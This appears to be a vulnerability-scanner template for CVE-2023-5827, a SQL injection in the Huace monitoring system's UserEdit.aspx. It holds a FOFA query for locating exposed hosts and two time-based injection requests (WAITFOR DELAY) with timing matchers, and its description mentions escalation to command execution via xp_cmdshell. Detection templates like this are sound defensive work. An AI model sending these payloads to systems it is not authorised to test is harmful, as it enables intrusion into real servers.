id: huace-UserEdit-sql-injection

info:
  tags: huace-UserEdit-sql-injection
  name: 华测监测预警系统2.2 UserEdit.aspx SQL注入致RCE漏洞(CVE-2023-5827)
  author: xc
  severity: high
  description: |-
    fofa: icon_hash="-628229493"
    华测监测预警系统2.2 UserEdit.aspx 接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

http:
  - raw:
      - |
        POST /Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept: application/json, text/javascript, */*; q=0.01



      - |
        POST /Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept: application/json, text/javascript, */*; q=0.01

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and 
      - type: status
        status: 
          - 200





